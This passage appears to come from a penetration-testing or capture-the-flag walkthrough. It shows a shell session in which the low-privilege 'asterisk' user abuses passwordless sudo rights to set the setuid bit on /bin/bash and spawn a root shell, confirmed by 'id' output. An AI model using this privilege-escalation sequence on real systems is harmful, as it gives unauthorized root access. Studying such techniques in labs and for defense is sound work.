    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

bash-3.2$ sudo chmod 4755 /bin/bash

bash-3.2$ /bin/bash -p

id
uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
```
